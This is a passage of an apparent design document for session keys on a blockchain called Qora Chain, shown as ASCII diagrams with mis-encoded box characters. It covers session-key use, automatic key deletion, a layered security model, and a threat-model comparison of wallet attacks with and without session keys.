â”‚   â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚                     â”‚                             â”‚
â”‚   â”‚                     â”‚                     â”‚                             â”‚
â”‚                                                                             â”‚
â”‚  USING A SESSION KEY                                                        â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                        â”‚
â”‚                                                                             â”‚
â”‚  User                 dApp               Qora Chain                          â”‚
â”‚   â”‚                     â”‚                     â”‚                             â”‚
â”‚   â”‚  "Buy sword (50 QORA)"                     â”‚                             â”‚
â”‚   â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚                     â”‚                             â”‚
â”‚   â”‚                     â”‚                     â”‚                             â”‚
â”‚   â”‚  (no prompt!)       â”‚  Transaction signed â”‚                             â”‚
â”‚   â”‚                     â”‚  with session key   â”‚                             â”‚
â”‚   â”‚                     â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚                             â”‚
â”‚   â”‚                     â”‚                     â”‚                             â”‚
â”‚   â”‚                     â”‚                     â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚   â”‚                     â”‚                     â”‚  â”‚ Validator Checks:   â”‚   â”‚
â”‚   â”‚                     â”‚                     â”‚  â”‚ âœ“ Session exists    â”‚   â”‚
â”‚   â”‚                     â”‚                     â”‚  â”‚ âœ“ Not expired       â”‚   â”‚
â”‚   â”‚                     â”‚                     â”‚  â”‚ âœ“ Uses remaining    â”‚   â”‚
â”‚   â”‚                     â”‚                     â”‚  â”‚ âœ“ Amount â‰¤ 100 QORA  â”‚   â”‚
â”‚   â”‚                     â”‚                     â”‚  â”‚ âœ“ Contract allowed  â”‚   â”‚
â”‚   â”‚                     â”‚                     â”‚  â”‚ â†’ Execute tx        â”‚   â”‚
â”‚   â”‚                     â”‚                     â”‚  â”‚ â†’ Decrement uses    â”‚   â”‚
â”‚   â”‚                     â”‚                     â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚   â”‚                     â”‚                     â”‚                             â”‚
â”‚   â”‚                     â”‚    Success          â”‚                             â”‚
â”‚   â”‚                     â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚                             â”‚
â”‚   â”‚                     â”‚                     â”‚                             â”‚
â”‚   â”‚  "Sword purchased!" â”‚                     â”‚                             â”‚
â”‚   â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚                     â”‚                             â”‚
â”‚   â”‚                     â”‚                     â”‚                             â”‚
â”‚                                                                             â”‚
â”‚  AUTOMATIC KEY DELETION                                                     â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                     â”‚
â”‚                                                                             â”‚
â”‚   â”‚                     â”‚                     â”‚                             â”‚
â”‚   â”‚                     â”‚  Final transaction  â”‚                             â”‚
â”‚   â”‚                     â”‚  (uses_remaining=1) â”‚                             â”‚
â”‚   â”‚                     â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚                             â”‚
â”‚   â”‚                     â”‚                     â”‚                             â”‚
â”‚   â”‚                     â”‚                     â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚   â”‚                     â”‚                     â”‚  â”‚ Execute transaction â”‚   â”‚
â”‚   â”‚                     â”‚                     â”‚  â”‚ uses_remaining = 0  â”‚   â”‚
â”‚   â”‚                     â”‚                     â”‚  â”‚                     â”‚   â”‚
â”‚   â”‚                     â”‚                     â”‚  â”‚ auto_delete = true  â”‚   â”‚
â”‚   â”‚                     â”‚                     â”‚  â”‚ â†’ DELETE KEY        â”‚   â”‚
â”‚   â”‚                     â”‚                     â”‚  â”‚                     â”‚   â”‚
â”‚   â”‚                     â”‚                     â”‚  â”‚ Key GONE from chain â”‚   â”‚
â”‚   â”‚                     â”‚                     â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚   â”‚                     â”‚                     â”‚                             â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## Security Model

### Defense in Depth

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                          SECURITY LAYERS                                    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  LAYER 1: MASTER KEY PROTECTION                                            â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                              â”‚   â”‚
â”‚  â”‚   â”‚  HARDWARE        â”‚  â€¢ TPM (Windows)                             â”‚   â”‚
â”‚  â”‚   â”‚  SECURITY        â”‚  â€¢ Secure Enclave (Apple)                    â”‚   â”‚
â”‚  â”‚   â”‚  MODULE          â”‚  â€¢ Titan M (Android)                         â”‚   â”‚
â”‚  â”‚   â”‚                  â”‚                                              â”‚   â”‚
â”‚  â”‚   â”‚  Master Key      â”‚  Key NEVER leaves chip                       â”‚   â”‚
â”‚  â”‚   â”‚  Lives HERE      â”‚  Key NEVER in browser memory                 â”‚   â”‚
â”‚  â”‚   â”‚                  â”‚  Requires biometric to sign                  â”‚   â”‚
â”‚  â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                              â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚   Attack Surface: Physical device theft + biometric bypass          â”‚   â”‚
â”‚  â”‚   Difficulty: EXTREMELY HIGH                                        â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â”‚  LAYER 2: SESSION KEY PERMISSIONS                                          â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                          â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚   Even if session key is stolen, attacker is LIMITED:               â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚   â”‚
â”‚  â”‚   â”‚  PERMISSION          â”‚  LIMIT           â”‚  ATTACK BLOCKED   â”‚   â”‚   â”‚
â”‚  â”‚   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤   â”‚   â”‚
â”‚  â”‚   â”‚  max_amount_per_tx   â”‚  100 QORA         â”‚  Drain wallet     â”‚   â”‚   â”‚
â”‚  â”‚   â”‚  total_spend_limit   â”‚  500 QORA         â”‚  Large theft      â”‚   â”‚   â”‚
â”‚  â”‚   â”‚  allowed_recipients  â”‚  [game, friend]  â”‚  Send to hacker   â”‚   â”‚   â”‚
â”‚  â”‚   â”‚  allowed_contracts   â”‚  [game.qora]      â”‚  Call any contractâ”‚   â”‚   â”‚
â”‚  â”‚   â”‚  max_uses            â”‚  1000            â”‚  Infinite txs     â”‚   â”‚   â”‚
â”‚  â”‚   â”‚  expires_at          â”‚  24 hours        â”‚  Long-term access â”‚   â”‚   â”‚
â”‚  â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚   Maximum Possible Loss: 500 QORA (total_spend_limit)                â”‚   â”‚
â”‚  â”‚   Remaining Funds: SAFE                                             â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â”‚  LAYER 3: PROTOCOL ENFORCEMENT                                             â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚   Validators enforce ALL rules at consensus level:                  â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚   Transaction                                                       â”‚   â”‚
â”‚  â”‚       â”‚                                                             â”‚   â”‚
â”‚  â”‚       â–¼                                                             â”‚   â”‚
â”‚  â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                              â”‚   â”‚
â”‚  â”‚   â”‚   VALIDATOR     â”‚                                              â”‚   â”‚
â”‚  â”‚   â”‚   CHECKS        â”‚                                              â”‚   â”‚
â”‚  â”‚   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€   â”‚                                              â”‚   â”‚
â”‚  â”‚   â”‚   âœ“ Key exists? â”‚â”€â”€â–º No  â†’ REJECT                              â”‚   â”‚
â”‚  â”‚   â”‚   âœ“ Not expired?â”‚â”€â”€â–º No  â†’ REJECT                              â”‚   â”‚
â”‚  â”‚   â”‚   âœ“ Uses left?  â”‚â”€â”€â–º No  â†’ REJECT                              â”‚   â”‚
â”‚  â”‚   â”‚   âœ“ Amount OK?  â”‚â”€â”€â–º No  â†’ REJECT                              â”‚   â”‚
â”‚  â”‚   â”‚   âœ“ Recipient OKâ”‚â”€â”€â–º No  â†’ REJECT                              â”‚   â”‚
â”‚  â”‚   â”‚   âœ“ Contract OK?â”‚â”€â”€â–º No  â†’ REJECT                              â”‚   â”‚
â”‚  â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                              â”‚   â”‚
â”‚  â”‚            â”‚                                                        â”‚   â”‚
â”‚  â”‚            â–¼ All pass                                               â”‚   â”‚
â”‚  â”‚       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                              â”‚   â”‚
â”‚  â”‚       â”‚  EXECUTE    â”‚                                              â”‚   â”‚
â”‚  â”‚       â”‚  TRANSACTIONâ”‚                                              â”‚   â”‚
â”‚  â”‚       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                              â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚   Cannot be bypassed - enforced by consensus                        â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â”‚  LAYER 4: AUTOMATIC CLEANUP                                                â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚   Keys automatically removed when:                                  â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚   â€¢ uses_remaining = 0  â†’  Immediate deletion                       â”‚   â”‚
â”‚  â”‚   â€¢ expires_at reached  â†’  Pruned in EndBlocker                     â”‚   â”‚
â”‚  â”‚   â€¢ User revokes        â†’  Immediate deletion                       â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚   No lingering keys = No lingering risk                             â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Attack Scenario Analysis

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                       ATTACK SCENARIO COMPARISON                            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  SCENARIO: Malicious Browser Extension (Trust Wallet Attack Vector)        â”‚
â”‚                                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  WITHOUT SESSION KEYS:                                              â”‚   â”‚
â”‚  â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚    Wallet               Malicious Code            Result            â”‚   â”‚
â”‚  â”‚      â”‚                       â”‚                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚  User unlocks wallet  â”‚                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚                       â”‚                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚  Master key decrypted â”‚                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚  in memory            â”‚                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚         â”‚ INTERCEPT   â”‚                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚         â”‚ & STEAL     â”‚                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚              â”‚   â”‚
â”‚  â”‚      â”‚                       â”‚     Send to attacker  â”‚              â”‚   â”‚
â”‚  â”‚      â”‚                       â”‚                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚                       â”‚              TOTAL LOSS              â”‚   â”‚
â”‚  â”‚      â”‚                       â”‚              â•â•â•â•â•â•â•â•â•â•              â”‚   â”‚
â”‚  â”‚      â”‚                       â”‚              $50,000 GONE            â”‚   â”‚
â”‚  â”‚      â”‚                       â”‚              FOREVER                 â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  WITH SESSION KEYS + WEBAUTHN:                                      â”‚   â”‚
â”‚  â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                      â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚    Secure Chip         Malicious Code             Result            â”‚   â”‚
â”‚  â”‚      â”‚                       â”‚                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚  Master key in chip   â”‚                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚  (never exposed)      â”‚                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚                       â”‚                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚         â”‚ CAN'T       â”‚                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚         â”‚ ACCESS      â”‚  âœ— Nothing to steal  â”‚              â”‚   â”‚
â”‚  â”‚      â”‚         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚                                               â”‚              â”‚   â”‚
â”‚  â”‚      â”‚                                     MASTER KEY SAFE          â”‚   â”‚
â”‚  â”‚      â”‚                                                              â”‚   â”‚
â”‚  â”‚    Browser             Malicious Code             Result            â”‚   â”‚
â”‚  â”‚      â”‚                       â”‚                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚  Session key (limited)â”‚                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚  stored locally       â”‚                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚         â”‚ STEAL       â”‚                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚         â”‚ SESSION KEY â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚              â”‚   â”‚
â”‚  â”‚      â”‚         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                       â”‚              â”‚   â”‚
â”‚  â”‚      â”‚                                               â”‚              â”‚   â”‚
â”‚  â”‚      â”‚                                     LIMITED LOSS             â”‚   â”‚
â”‚  â”‚      â”‚                                     â•â•â•â•â•â•â•â•â•â•â•â•             â”‚   â”‚
â”‚  â”‚      â”‚                                     Max: 500 QORA             â”‚   â”‚
â”‚  â”‚      â”‚                                     (total_spend_limit)      â”‚   â”‚
â”‚  â”‚      â”‚                                                              â”‚   â”‚
â”‚  â”‚      â”‚                                     REMAINING $49,500        â”‚   â”‚
â”‚  â”‚      â”‚                                     â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•          â”‚   â”‚
â”‚  â”‚      â”‚                                     COMPLETELY SAFE          â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â”‚  COMPARISON SUMMARY                                                         â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                         â”‚
â”‚                                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”‚
â”‚  â”‚    Attack Type    â”‚   Without Session   â”‚    With Session Keys    â”‚     â”‚
â”‚  â”‚                   â”‚       Keys          â”‚                         â”‚     â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤     â”‚
â”‚  â”‚ Malicious         â”‚ TOTAL LOSS          â”‚ Limited loss (â‰¤500 QORA) â”‚     â”‚
â”‚  â”‚ extension         â”‚ ($50,000)           â”‚ Master key SAFE         â”‚     â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤     â”‚
â”‚  â”‚ Phishing          â”‚ TOTAL LOSS          â”‚ Session key useless     â”‚     â”‚
â”‚  â”‚ (seed phrase)     â”‚                     â”‚ (no seed phrase)        â”‚     â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤     â”‚
â”‚  â”‚ Clipboard         â”‚ TOTAL LOSS          â”‚ N/A (no seed to copy)   â”‚     â”‚
â”‚  â”‚ malware           â”‚                     â”‚                         â”‚     â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤     â”‚
â”‚  â”‚ Key theft during  â”‚ TOTAL LOSS          â”‚ Impossible (key in      â”‚     â”‚
